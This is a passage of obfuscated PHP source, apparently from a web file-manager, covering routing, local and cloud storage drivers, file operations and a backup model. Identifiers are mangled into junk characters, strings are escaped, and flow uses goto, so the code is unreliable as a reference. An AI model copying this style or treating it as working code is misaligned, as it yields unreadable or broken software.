(self::$methods[$“¿íÑÀê] == $ÌÇ‘½ÚÙ || self::$methods[$“¿íÑÀê] == $º´šÆÇ©[1702] || !empty(self::$maps[$“¿íÑÀê]) && in_array($ÌÇ‘½ÚÙ, self::$maps[$“¿íÑÀê])) { $¥›‚ÏÃõ = !0; array_shift($† ¡€‰ñ); if (!is_object(self::$callbacks[$“¿íÑÀê])) { $Ëƒ‘Í£Õ = explode($º´šÆÇ©[8], self::$callbacks[$“¿íÑÀê]); $ğİ®¥ = end($Ëƒ‘Í£Õ); $ Ô¹ªÖÕ = explode($º´šÆÇ©[1286], $ğİ®¥); $ìÙ“ó„ü = new $ Ô¹ªÖÕ[0](); if (!method_exists($ìÙ“ó„ü, $ Ô¹ªÖÕ[1])) { echo $º´šÆÇ©[1705]; } else { call_user_func_array(array($ìÙ“ó„ü, $ Ô¹ªÖÕ[1]), $† ¡€‰ñ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$“¿íÑÀê], $† ¡€‰ñ); if (self::$halts) { return; } } } } $“¿íÑÀê++; } } if ($¥›‚ÏÃõ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $„ıî­Áµ =& $_SERVER[ˆ¡¹µ‹Â]; header($_SERVER[$„ıî­Áµ[1706]] . $„ıî­Áµ[1707]); echo $„ıî­Áµ[1708]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$º´šÆÇ©[1701]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto DÓ–ì±ˆµ—; E ‡ï‹ŒÀ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Œ¾ç…Ê) { if (substr($Œ¾ç…Ê, 0, 2) == $_SERVER[ˆ¡¹µ‹Â][1403]) { $Œ¾ç…Ê = BASIC_PATH . substr($Œ¾ç…Ê, 2); } return $Œ¾ç…Ê; } public function iconvApp($«Ô¡ª‘) { $ûŸ±×¹Ì =& $_SERVER[ˆ¡¹µ‹Â]; global $config; return $this->iconvTo($«Ô¡ª‘, $config[$ûŸ±×¹Ì[1430]], $config[$ûŸ±×¹Ì[1429]]); } public function iconvSystem($Í÷‘‘öõ) { $³„ø•ß =& $_SERVER[ˆ¡¹µ‹Â]; global $config; return $this->iconvTo($Í÷‘‘öõ, $config[$³„ø•ß[1429]], $config[$³„ø•ß[1430]]); } public function getPathOuter($œÄÊ»ëÎ) { $ŒóÄÈ•Ã =& $_SERVER[ˆ¡¹µ‹Â]; $ùõçŒ£ = $this->iconvApp($this->pathBase); $œÄÊ»ëÎ = $this->iconvApp($œÄÊ»ëÎ); if (substr($ùõçŒ£, 0, 2) == $ŒóÄÈ•Ã[1403]) { $ùõçŒ£ = BASIC_PATH . substr($ùõçŒ£, 2); } if (substr($œÄÊ»ëÎ, 0, 2) == $ŒóÄÈ•Ã[1403]) { $œÄÊ»ëÎ = BASIC_PATH . substr($œÄÊ»ëÎ, 2); } $ùõçŒ£ = KodIO::clear($ùõçŒ£); $œÄÊ»ëÎ = KodIO::clear($œÄÊ»ëÎ); $œÄÊ»ëÎ = substr($œÄÊ»ëÎ, strlen($ùõçŒ£)); if (empty($this->pathDriver)) { return $œÄÊ»ëÎ; } return $this->pathDriver . $ŒóÄÈ•Ã[8] . ltrim($œÄÊ»ëÎ, $ŒóÄÈ•Ã[8]); } public function mkfile($Ğ¦¯±¹, $Ÿñ‹ÓÔå = '', $Á‡Ò×Ğı = REPEAT_RENAME) { $Ğ¦¯±¹ = $this->iconvSystem($Ğ¦¯±¹); @touch($Ğ¦¯±¹); if ($Ÿñ‹ÓÔå) { file_put_contents($Ğ¦¯±¹, $Ÿñ‹ÓÔå); } @chmod($Ğ¦¯±¹, $this->pathAuth); if (is_file($Ğ¦¯±¹)) { return $this->getPathOuter($Ğ¦¯±¹); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); return !1; } public function mkdir($×ˆİ…¹ò, $ë’ÂùÜö = REPEAT_SKIP) { $×ˆİ…¹ò = $this->iconvSystem($×ˆİ…¹ò); if (is_dir($×ˆİ…¹ò)) { return $this->getPathOuter($×ˆİ…¹ò); } @mkdir($×ˆİ…¹ò, $this->pathAuth, !0); @chmod($×ˆİ…¹ò, $this->pathAuth); if (is_dir($×ˆİ…¹ò)) { return $this->getPathOuter($×ˆİ…¹ò); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); return !1; } public function copyFile($ëş¾ÂõÄ, $ç†Î·ª) { $this->mkdir($this->pathFather($ç†Î·ª)); $ëş¾ÂõÄ = $this->iconvSystem($ëş¾ÂõÄ); $ç†Î·ª = $this->iconvSystem($ç†Î·ª); $ ø‰¦¢ = copy_64($ëş¾ÂõÄ, $ç†Î·ª); @chmod($ç†Î·ª, $this->pathAuth); if ($ ø‰¦¢) { return $this->getPathOuter($ç†Î·ª); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); return !1; } public function moveFile($Ûè™Ñ¿¥, $üŸ‘É„) { $this->mkdir($this->pathFather($üŸ‘É„)); $Ûè™Ñ¿¥ = $this->iconvSystem($Ûè™Ñ¿¥); $üŸ‘É„ = $this->iconvSystem($üŸ‘É„); $ä”º‹« = intval(@rename($Ûè™Ñ¿¥, $üŸ‘É„)); if (!$ä”º‹«) { if ($ä”º‹« = intval(@copy_64($Ûè™Ñ¿¥, $üŸ‘É„))) { @unlink($Ûè™Ñ¿¥); } } @chmod($üŸ‘É„, $this->pathAuth); if ($ä”º‹«) { return $this->getPathOuter($üŸ‘É„); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); return !1; } public function movePath($ØïÅ©Û², $İè¾¡Õ¤, $ù Ş•î’ = false) { $ßÎ˜ˆâ =& $_SERVER[ˆ¡¹µ‹Â]; $ØïÅ©Û² = $this->iconvSystem($ØïÅ©Û²); $İè¾¡Õ¤ = $this->iconvSystem($İè¾¡Õ¤); $•ºóœÇ = rtrim($İè¾¡Õ¤, $ßÎ˜ˆâ[8]) . $ßÎ˜ˆâ[8] . ($ù Ş•î’ ? $ù Ş•î’ : get_path_this($ØïÅ©Û²)); if (file_exists($•ºóœÇ)) { return !1; } $§Ìø½â› = intval(@rename($ØïÅ©Û², $•ºóœÇ)); $§Ìø½â› = file_exists($•ºóœÇ); if ($§Ìø½â›) { return $this->getPathOuter($•ºóœÇ); } $this->writeLog(__FUNCTION__ . $ßÎ˜ˆâ[1441], !0); return !1; } public function delFile($µË¼Ì’) { $µË¼Ì’ = $this->iconvSystem($µË¼Ì’); if (!@unlink($µË¼Ì’)) { @chmod($µË¼Ì’, $this->pathAuth); if (@unlink($µË¼Ì’)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); return !1; } return !0; } public function delFolder($›™ÏêÃ) { $Î‹‘õ…† =& $_SERVER[ˆ¡¹µ‹Â]; $›™ÏêÃ = $this->iconvSystem($›™ÏêÃ); if (!is_dir($›™ÏêÃ)) { return !0; } if (!($§‚ìÔïÎ = opendir($›™ÏêÃ))) { return !1; } while (($¿ğ÷äşÕ = readdir($§‚ìÔïÎ)) !== !1) { if ($¿ğ÷äşÕ == $Î‹‘õ…†[10] || $¿ğ÷äşÕ == $Î‹‘õ…†[1356]) { continue; } $àÀ¥¡÷ = $›™ÏêÃ . $Î‹‘õ…†[8] . $¿ğ÷äşÕ; if (is_file($àÀ¥¡÷) || is_link($àÀ¥¡÷)) { if (!unlink($àÀ¥¡÷)) { chmod($àÀ¥¡÷, $this->pathAuth); if (!unlink($àÀ¥¡÷)) { return !1; } } } else { if (is_dir($àÀ¥¡÷)) { chmod($àÀ¥¡÷, $this->pathAuth); $àÀ¥¡÷ = $this->iconvApp($àÀ¥¡÷); if (!$this->delFolder($àÀ¥¡÷)) { return !1; } } } } closedir($§‚ìÔïÎ); return rmdir($›™ÏêÃ); } public function rename($Ü©ÆÖĞ, $ŞÔÒÅİä) { $¯”ª«²£ =& $_SERVER[ˆ¡¹µ‹Â]; $ô½×ÃÂÙ = $this->fileNameAuto($this->pathFather($Ü©ÆÖĞ), $ŞÔÒÅİä); $ô½×ÃÂÙ = $this->iconvSystem($ô½×ÃÂÙ); $Ü©ÆÖĞ = $this->iconvSystem($Ü©ÆÖĞ); $—¯ Æíƒ = $this->pathFather($Ü©ÆÖĞ); $†Ú¸«Ëƒ = rtrim($—¯ Æíƒ, $¯”ª«²£[8]) . $¯”ª«²£[8] . $ô½×ÃÂÙ; $ÛÛŞÍ¨Ç = @rename($Ü©ÆÖĞ, $†Ú¸«Ëƒ); $†Ú¸«Ëƒ = $this->iconvApp($†Ú¸«Ëƒ); if ($ÛÛŞÍ¨Ç) { return $this->getPathOuter($†Ú¸«Ëƒ); } $this->writeLog(__FUNCTION__ . $¯”ª«²£[1441], !0); return !1; } public function size($½ ÄÕ«õ) { $½ ÄÕ«õ = $this->iconvSystem($½ ÄÕ«õ); return filesize_64($½ ÄÕ«õ); } public function info($Ú¹ó»¶ª) { $Ú¹ó»¶ª = $this->iconvSystem($Ú¹ó»¶ª); if ($this->isFolder($Ú¹ó»¶ª)) { return $this->folderInfo($Ú¹ó»¶ª); } else { if ($this->isFile($Ú¹ó»¶ª)) { return $this->fileInfo($Ú¹ó»¶ª); } } return !1; } protected function infoChildren($å¥ƒ™¶, &$¥ƒÎõÂû, $¡ÖğùÛ× = true) { $ÉŠÒåÑ¬ =& $_SERVER[ˆ¡¹µ‹Â]; check_abort_echo(); $å¥ƒ™¶ = rtrim($å¥ƒ™¶, $ÉŠÒåÑ¬[8]) . $ÉŠÒåÑ¬[8]; if ($¡ÖğùÛ×) { $å¥ƒ™¶ = $this->iconvSystem($å¥ƒ™¶); } if (!($ï¾š¿Ï³ = @opendir($å¥ƒ™¶))) { return; } while (($ÌüˆËŞ = readdir($ï¾š¿Ï³)) !== !1) { if ($ÌüˆËŞ == $ÉŠÒåÑ¬[10] || $ÌüˆËŞ == $ÉŠÒåÑ¬[1356]) { continue; } $û†“ï”œ = $å¥ƒ™¶ . $ÌüˆËŞ; if (is_file($û†“ï”œ) || is_link($û†“ï”œ)) { $¥ƒÎõÂû[$ÉŠÒåÑ¬[80]]++; $¥ƒÎõÂû[$ÉŠÒåÑ¬[79]] += filesize_64($û†“ï”œ); } else { if (is_dir($û†“ï”œ)) { $¥ƒÎõÂû[$ÉŠÒåÑ¬[81]]++; $this->infoChildren($û†“ï”œ, $¥ƒÎõÂû, !1); } } } closedir($ï¾š¿Ï³); } private function folderInfo($– ‹Ñ²¼, $ÖîËÃõ = false) { $¶ú×ÛöĞ =& $_SERVER[ˆ¡¹µ‹Â]; $– ‹Ñ²¼ = rtrim($– ‹Ñ²¼, $¶ú×ÛöĞ[8]) . $¶ú×ÛöĞ[8]; $ïåûĞ¼¸ = $this->iconvApp($this->pathThis($– ‹Ñ²¼)); if ($ÖîËÃõ) { return array($¶ú×ÛöĞ[32] => $ïåûĞ¼¸, $¶ú×ÛöĞ[87] => $this->getPathOuter($– ‹Ñ²¼), $¶ú×ÛöĞ[33] => $¶ú×ÛöĞ[78]); } $‹ªŞßŠş = array($¶ú×ÛöĞ[32] => $ïåûĞ¼¸, $¶ú×ÛöĞ[87] => $this->getPathOuter($– ‹Ñ²¼), $¶ú×ÛöĞ[33] => $¶ú×ÛöĞ[78], $¶ú×ÛöĞ[231] => @filectime($– ‹Ñ²¼), $¶ú×ÛöĞ[88] => @filemtime($– ‹Ñ²¼), $¶ú×ÛöĞ[1445] => @fileatime($– ‹Ñ²¼), $¶ú×ÛöĞ[1446] => is_readable($– ‹Ñ²¼), $¶ú×ÛöĞ[1447] => is_writable($– ‹Ñ²¼), $¶ú×ÛöĞ[1448] => get_mode($– ‹Ñ²¼)); return $‹ªŞßŠş; } private function fileInfo($éâõòï¶, $»…ßêˆô = false) { $’Óƒ‹µò =& $_SERVER[ˆ¡¹µ‹Â]; $¹üûĞŸ« = $this->iconvApp($this->pathThis($éâõòï¶)); if ($»…ßêˆô) { return array($’Óƒ‹µò[32] => $¹üûĞŸ«, $’Óƒ‹µò[87] => $this->getPathOuter($éâõòï¶), $’Óƒ‹µò[33] => $’Óƒ‹µò[230], $’Óƒ‹µò[79] => $this->size($éâõòï¶), $’Óƒ‹µò[169] => $this->ext($¹üûĞŸ«)); } $ëË’–Éà = array($’Óƒ‹µò[32] => $¹üûĞŸ«, $’Óƒ‹µò[87] => $this->getPathOuter($éâõòï¶), $’Óƒ‹µò[33] => $’Óƒ‹µò[230], $’Óƒ‹µò[231] => @filectime($éâõòï¶), $’Óƒ‹µò[88] => @filemtime($éâõòï¶), $’Óƒ‹µò[1445] => @fileatime($éâõòï¶), $’Óƒ‹µò[79] => $this->size($éâõòï¶), $’Óƒ‹µò[169] => $this->ext($¹üûĞŸ«), $’Óƒ‹µò[1446] => is_readable($éâõòï¶), $’Óƒ‹µò[1447] => is_writable($éâõòï¶), $’Óƒ‹µò[1448] => get_mode($éâõòï¶)); return $ëË’–Éà; } public function exist($ƒ Àß™«) { $ƒ Àß™« = $this->iconvSystem($ƒ Àß™«); return @file_exists($ƒ Àß™«); } public function isFile($¹¢öƒ…ç) { $¹¢öƒ…ç = $this->iconvSystem($¹¢öƒ…ç); return @is_file($¹¢öƒ…ç); } public function isFolder($Äß÷Ë¡â) { $Äß÷Ë¡â = $this->iconvSystem($Äß÷Ë¡â); return @is_dir($Äß÷Ë¡â); } public function listPath($€½Ú·, $×®Í‹é = false) { $ÌÇÀé¬Ò =& $_SERVER[ˆ¡¹µ‹Â]; $€½Ú· = $this->iconvSystem($€½Ú·); $€½Ú· = rtrim($€½Ú·, $ÌÇÀé¬Ò[8]) . $ÌÇÀé¬Ò[8]; $öÚ« À˜ = array($ÌÇÀé¬Ò[85] => array(), $ÌÇÀé¬Ò[86] => array()); if (!($¥–Îáû = @opendir($€½Ú·))) { return $öÚ« À˜; } while (($¿¸ÊŸË = readdir($¥–Îáû)) !== !1) { if ($¿¸ÊŸË == $ÌÇÀé¬Ò[10] || $¿¸ÊŸË == $ÌÇÀé¬Ò[1356]) { continue; } $®‰”–å = $€½Ú· . $¿¸ÊŸË; if (is_file($®‰”–å)) { $öÚ« À˜[$ÌÇÀé¬Ò[86]][] = $this->fileInfo($®‰”–å, $×®Í‹é); } else { $öÚ« À˜[$ÌÇÀé¬Ò[85]][] = $this->folderInfo($®‰”–å, $×®Í‹é); } } closedir($¥–Îáû); return $öÚ« À˜; } public function listAll($Í¶¹Ó˜ª, &$‰Ê»óš‘ = array()) { $äÌÜÜàº =& $_SERVER[ˆ¡¹µ‹Â]; $Í¶¹Ó˜ª = $this->iconvSystem($Í¶¹Ó˜ª); $Í¶¹Ó˜ª = rtrim($Í¶¹Ó˜ª, $äÌÜÜàº[8]) . $äÌÜÜàº[8]; if (!($ä«ó©½Á = @opendir($Í¶¹Ó˜ª))) { return $‰Ê»óš‘; } while (($µ¶¥Ö× = readdir($ä«ó©½Á)) !== !1) { if ($µ¶¥Ö× == $äÌÜÜàº[10] || $µ¶¥Ö× == $äÌÜÜàº[1356]) { continue; } $¥¶ÇÜ´ = $Í¶¹Ó˜ª . $µ¶¥Ö×; $ìÇ—Ëˆ = is_dir($¥¶ÇÜ´) && !is_link($¥¶ÇÜ´) ? 1 : 0; $¥¶ÇÜ´ = $ìÇ—Ëˆ ? $¥¶ÇÜ´ . $äÌÜÜàº[8] : $¥¶ÇÜ´; $‰Ê»óš‘[] = array($äÌÜÜàº[87] => $¥¶ÇÜ´, $äÌÜÜàº[78] => $ìÇ—Ëˆ, $äÌÜÜàº[88] => intval(@filemtime($¥¶ÇÜ´)), $äÌÜÜàº[79] => $ìÇ—Ëˆ ? 0 : intval($this->size($¥¶ÇÜ´))); if ($ìÇ—Ëˆ) { $this->listAll($¥¶ÇÜ´, $‰Ê»óš‘); } } closedir($ä«ó©½Á); return $‰Ê»óš‘; } public function has($ºê°Âñ‹, $¹Ëş—ÃÜ = false, $ƒ¿… Ş˜ = true) { $™Ï¼Ù» =& $_SERVER[ˆ¡¹µ‹Â]; $ºê°Âñ‹ = $this->iconvSystem($ºê°Âñ‹); $ºê°Âñ‹ = rtrim($ºê°Âñ‹, $™Ï¼Ù»[8]) . $™Ï¼Ù»[8]; if (!($ş¼ôÛ = @opendir($ºê°Âñ‹))) { return !1; } $ó€´ß½ı = 0; $Ó±‡Ãèå = 0; $Û£å = 0; while (($Âé­®Æ‚ = readdir($ş¼ôÛ)) !== !1) { if ($Âé­®Æ‚ == $™Ï¼Ù»[10] || $Âé­®Æ‚ == $™Ï¼Ù»[1356]) { continue; } $²ê¡Î = $ºê°Âñ‹ . $Âé­®Æ‚; if ($¹Ëş—ÃÜ) { $Û£å++; if (@is_file($²ê¡Î)) { $ó€´ß½ı++; } else { $Ó±‡Ãèå++; } if ($Û£å > 10000) { break; } continue; } if ($ƒ¿… Ş˜) { if (@is_file($²ê¡Î)) { return !0; } } else { if (@is_dir($²ê¡Î . $™Ï¼Ù»[8])) { return !0; } } } closedir($ş¼ôÛ); if ($¹Ëş—ÃÜ) { return array($™Ï¼Ù»[239] => $ó€´ß½ı, $™Ï¼Ù»[240] => $Ó±‡Ãèå); } return !1; } public function hashSimple($çëÆ¿áÔ) { $·¿”§† =& $_SERVER[ˆ¡¹µ‹Â]; if (!$çëÆ¿áÔ) { return md5($·¿”§†[12]); } $çëÆ¿áÔ = $this->iconvSystem($çëÆ¿áÔ); $Ğšú¥åñ = $this->size($çëÆ¿áÔ); $ÄÛèÛšé = 200; $¯›‚ßœ¤ = 50; if ($Ğšú¥åñ <= $ÄÛèÛšé * $¯›‚ßœ¤) { return $this->hashMd5($çëÆ¿áÔ) . $Ğšú¥åñ; } $×œŒ‰Ü¼ = $·¿”§†[12]; $™µ÷¯‡ = intval($Ğšú¥åñ / $¯›‚ßœ¤); $ü™Ö‹Õ¹ = fopen($çëÆ¿áÔ, $·¿”§†[1449]); if (!$ü™Ö‹Õ¹) { return $×œŒ‰Ü¼; } for ($ãÔŞ¿³ = 0; $ãÔŞ¿³ < $¯›‚ßœ¤; $ãÔŞ¿³++) { fseek_64($ü™Ö‹Õ¹, $™µ÷¯‡ * $ãÔŞ¿³); $×œŒ‰Ü¼ .= fread($ü™Ö‹Õ¹, $ÄÛèÛšé); } fseek_64($ü™Ö‹Õ¹, $Ğšú¥åñ - $ÄÛèÛšé); $×œŒ‰Ü¼ .= fread($ü™Ö‹Õ¹, $ÄÛèÛšé); fclose($ü™Ö‹Õ¹); return md5($×œŒ‰Ü¼) . $Ğšú¥åñ; } public function getContent($è¤£„›…) { $è¤£„›… = $this->iconvSystem($è¤£„›…); return file_get_contents($è¤£„›…); } public function setContent($—­è¹Ëœ, $ªàõŠ¤Ê = '') { $—­è¹Ëœ = $this->iconvSystem($—­è¹Ëœ); $´°®É‘³ = @file_put_contents($—­è¹Ëœ, $ªàõŠ¤Ê, LOCK_EX); if (!$´°®É‘³) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); } clearstatcache(); @chmod($—­è¹Ëœ, $this->pathAuth); return $´°®É‘³ === !1 ? !1 : !0; } public function fileSubstr($Ÿè£çˆ, $²óéû†Ó = 0, $¥ŒëÇò¨ = false) { $À»„§ë =& $_SERVER[ˆ¡¹µ‹Â]; $Ÿè£çˆ = $this->iconvSystem($Ÿè£çˆ); if ($¥ŒëÇò¨ === !1) { $¥ŒëÇò¨ = $this->size($Ÿè£çˆ); } if ($¥ŒëÇò¨ <= 0) { return $À»„§ë[12]; } $ù®ğ¶ç = fopen($Ÿè£çˆ, $À»„§ë[1449]); if (!$ù®ğ¶ç) { return !1; } fseek_64($ù®ğ¶ç, $²óéû†Ó); $Åá‰¢ï = fread($ù®ğ¶ç, $¥ŒëÇò¨); fclose($ù®ğ¶ç); if (!$Åá‰¢ï) { $this->writeLog(__FUNCTION__ . $À»„§ë[1441], !0); } return $Åá‰¢ï; } public function upload($¬®ˆêÜ£, $õÈêÅÜí, $êî’Æêá = false, $°«Ø™Ëø = REPEAT_REPLACE) { if ($êî’Æêá) { return $this->moveFile($õÈêÅÜí, $¬®ˆêÜ£); } return $this->copyFile($õÈêÅÜí, $¬®ˆêÜ£); } public function setModifyTime($ìÓÉ²±‰, $õ¬áşû = '') { @touch($ìÓÉ²±‰, intval($õ¬áşû)); } public function download($Ò–ç•†„, $›×Ü¨êê) { return $this->iconvSystem($Ò–ç•†„); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($—ºÊÆ‡ï) { parent::__construct($—ºÊÆ‡ï); $this->setSignVersion($_SERVER[ˆ¡¹µ‹Â][247]); } public function fileOutImage($Æƒ‡ÖÊÏ, $ë²Œâ…º = 250) { $âêØüÆ¯ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->size($Æƒ‡ÖÊÏ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Æƒ‡ÖÊÏ, $ë²Œâ…º); } $ÜŒµƒÂö = array($âêØüÆ¯[1450] => $âêØüÆ¯[1451] . $ë²Œâ…º . $âêØüÆ¯[1452]); $¸æşË“¾ = $this->link($Æƒ‡ÖÊÏ, $ÜŒµƒÂö); $this->fileOutLink($¸æşË“¾); } public function fileOutLink($©ÙåÇê) { $› †×¡ö =& $_SERVER[ˆ¡¹µ‹Â]; if (substr($©ÙåÇê, 0, 7) == $› †×¡ö[313]) { $©ÙåÇê = $› †×¡ö[314] . substr($©ÙåÇê, 7); } header($› †×¡ö[175] . $©ÙåÇê); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÂÙ­½Ş) { parent::__construct($ÂÙ­½Ş); $this->setSignVersion($_SERVER[ˆ¡¹µ‹Â][247]); } public function fileOutLink($¯š¶ı¬‘) { $ãœìì˜ =& $_SERVER[ˆ¡¹µ‹Â]; if (substr($¯š¶ı¬‘, 0, 7) == $ãœìì˜[313]) { $¯š¶ı¬‘ = $ãœìì˜[314] . substr($¯š¶ı¬‘, 7); } header($ãœìì˜[175] . $¯š¶ı¬‘); die; } } goto C¤Ÿ‰õöêÂ; aò µ™ë’ù: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\142\x61\x63\x6b\165\160\114\x69\163\x74"; public $field = array("\x69\x6f", "\156\x61\155\x65", "\x73\164\141\x74\165\x73", "\143\157\156\x74\x65\x6e\x74", "\155\141\156\165\141\154", "\x72\145\x73\x75\154\x74", "\x74\x69\x6d\x65\106\x72\157\x6d", "\x74\151\x6d\x65\x54\157"); public function config() { $£Ùº‡¥ =& $_SERVER[ˆ¡¹µ‹Â]; Action($£Ùº‡¥[1987])->taskInit(); $îí‹•Çü = Model($£Ùº‡¥[837])->get($£Ùº‡¥[858]); $îí‹•Çü = json_decode($îí‹•Çü, !0); $îí‹•Çü = is_array($îí‹•Çü) ? $îí‹•Çü : array(); $this->parseContent($îí‹•Çü); unset($îí‹•Çü[$£Ùº‡¥[1733]]); Model($£Ùº‡¥[1732])->cacheClear(); $£½ùëäÊ = $£Ùº‡¥[1988]; $ç§ñ‚Ìş = Model($£Ùº‡¥[1989])->findByKey($£Ùº‡¥[1751], $£½ùëäÊ); if (!$ç§ñ‚Ìş) { $ç§ñ‚Ìş = array(); } if (isset($ç§ñ‚Ìş[$£Ùº‡¥[206]])) { $ç§ñ‚Ìş[$£Ùº‡¥[206]] = json_decode($ç§ñ‚Ìş[$£Ùº‡¥[206]], !0); } if (isset($îí‹•Çü[$£Ùº‡¥[206]])) { $ç§ñ‚Ìş[$£Ùº‡¥[206]][$£Ùº‡¥[1736]] = $îí‹•Çü[$£Ùº‡¥[206]]; unset($îí‹•Çü[$£Ùº‡¥[206]]); } return array_merge($ç§ñ‚Ìş, $îí‹•Çü); } public function listData($¥Ùıù˜ = false, $ì»˜›’Ì = "\155\x6f\144\151\x66\x79\x54\x69\x6d\145", $ñµŒşêÏ = false) { $¾Œ‘şú¢ = parent::listData($¥Ùıù˜, $ì»˜›’Ì, !0); if (!$¾Œ‘şú¢) { return $¾Œ‘şú¢; } if ($¥Ùıù˜) { $¾Œ‘şú¢ = array($¾Œ‘şú¢); } foreach ($¾Œ‘şú¢ as &$ÅÁ¨¤) { $this->parseContent($ÅÁ¨¤); } return $¥Ùıù˜ ? $¾Œ‘şú¢[0] : $¾Œ‘şú¢; } public function parseContent(&$­—è´òŞ) { $İ“òôã© =& $_SERVER[ˆ¡¹µ‹Â]; $Ó„£Âı» = _get($­—è´òŞ, $İ“òôã©[171], $İ“òôã©[91]); if (!in_array($Ó„£Âı», array($İ“òôã©[843], $İ“òôã©[1204]))) { $­—è´òŞ[$İ“òôã©[171]] = $Ó„£Âı» == $İ“òôã©[91] ? $İ“òôã©[1204] : $İ“òôã©[843]; } } public function lastItem() { $º¡Â¸Ú‚ = $this->listData(); return !empty($º¡Â¸Ú‚[0]) ? $º¡Â¸Ú‚[0] : null; } public function kill($êø±–æ©) { $¡ñâòá¢ =& $_SERVER[ˆ¡¹µ‹Â]; $¤ÕÖ»ÃÉ = $this->listData($êø±–æ©); if (!$¤ÕÖ»ÃÉ || empty($¤ÕÖ»ÃÉ[$¡ñâòá¢[32]])) { return !0; } Task::kill($¡ñâòá¢[857]); Task::kill($¡ñâòá¢[875]); Task::kill($¡ñâòá¢[884]); $íƒÖÂë = $¤ÕÖ»ÃÉ[$¡ñâòá¢[32]]; $Èø¼ÁŸî = TEMP_FILES . $¡ñâòá¢[854] . $íƒÖÂë . $¡ñâòá¢[8]; IO::remove($Èø¼ÁŸî, !1); return $this->remove($êø±–æ©); } public function remove($¾›”ñå•) { $–™ÍÁœë = $this->listData($¾›”ñå•); if (!$–™ÍÁœë) { return !0; } return $this->backupRemove($–™ÍÁœë); } private function backupRemove($–÷ÎÑø) { parent::remove($–÷ÎÑø[$_SERVER[ˆ¡¹µ‹Â][475]]); $ô«é™°Ú = $this->backupPath($–÷ÎÑø); IO::remove($ô«é™°Ú, !1); return !0; } private function backupPath($Š’½‚À) { $ã¹“²¾‹ =& $_SERVER[ˆ¡¹µ‹Â]; $ ·ß–¿ı = $Š’½‚À[$ã¹“²¾‹[32]]; $İš“ÒÍ = Model($ã¹“²¾‹[837])->get($ã¹“²¾‹[838]); $“˜¤³÷½ = substr(md5($ã¹“²¾‹[839] . $İš“ÒÍ . $ ·ß–¿ı), 0, 8); return "\x7b\x69\157\x3a{$Š’½‚À[$ã¹“²¾‹[819]]}\175\x2f\144\x61\x74\x61\x62\x61\163\x65\x2f\x62\x61\143\153\165\160\x2f" . $ ·ß–¿ı . $ã¹“²¾‹[11] . $“˜¤³÷½; } public function start() { $ô’Ê›í =& $_SERVER[ˆ¡¹µ‹Â]; if ($GLOBALS[$ô’Ê›í[6]][$ô’Ê›í[92]][$ô’Ê›í[1990]] != $ô’Ê›í[91]) { return !0; } $Áôıê¢¬ = $this->config(); if (!$Áôıê¢¬ || $Áôıê¢¬[$ô’Ê›í[1733]] != $ô’Ê›í[91]) { return !1; } if ($Áôıê¢¬[$ô’Ê›í[171]] == $ô’Ê›í[843]) { $Åİ„Ş§Ï = Model($ô’Ê›í[837])->get($ô’Ê›í[1317]); if ($Åİ„Ş§Ï == $ô’Ê›í[1318]) { $Áôıê¢¬[$ô’Ê›í[171]] = $ô’Ê›í[1204]; } } $®íÈ¡ã = $this->process(); foreach ($®íÈ¡ã as $ûßîêÌ¾) { if ($ûßîêÌ¾) { return Task::restart($ûßîêÌ¾[$ô’Ê›í[475]]); } } $†½Ä¨ø² = new Backup(); $…î…‘¿Ğ = $†½Ä¨ø²->db(); if ($…î…‘¿Ğ) { $…î…‘¿Ğ = $†½Ä¨ø²->dbFile(); if ($…î…‘¿Ğ && $Áôıê¢¬[$ô’Ê›í[171]] == $ô’Ê›í[843]) { $…î…‘¿Ğ = $†½Ä¨ø²->file(); } } Backup::set(array($ô’Ê›í[817] => 1, $ô’Ê›í[828] => time())); return !0; } public function process() { $‰ÀÎ‰£ =& $_SERVER[ˆ¡¹µ‹Â]; $ˆóœëœ² = array($‰ÀÎ‰£[824] => Task::get($‰ÀÎ‰£[857]), $‰ÀÎ‰£[829] => Task::get($‰ÀÎ‰£[875]), $‰ÀÎ‰£[230] => Task::get($‰ÀÎ‰£[884])); $æ›ôÔ„ã = !1; foreach ($ˆóœëœ² as &$Äèî ªó) { if ($æ›ôÔ„ã) { $Äèî ªó = !1; continue; } if ($Äèî ªó) { $ƒú¨‹¨ = intval(_get($Äèî ªó, $‰ÀÎ‰£[1768], 0)); if (time() - $ƒú¨‹¨ > 7200) { Task::kill($Äèî ªó[$‰ÀÎ‰£[475]]); $æ›ôÔ„ã = !0; $Äèî ªó = !1; } } } return $ˆóœëœ²; } public function restore() { $úèšîùó =& $_SERVER[ˆ¡¹µ‹Â]; ActionCall($úèšîùó[1131], !0, 1); ActionCall($úèšîùó[1131], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\156\164"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\155\145" => "\143\157\x6d\x6d\x65\156\164\137\155\x65\x74\x61", "\x6d\145\x74\141\106\151\145\x6c\144" => "\143\x6f\x6d\155\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¾şÛ¨ˆï) { $ÓëÕ‰ =& 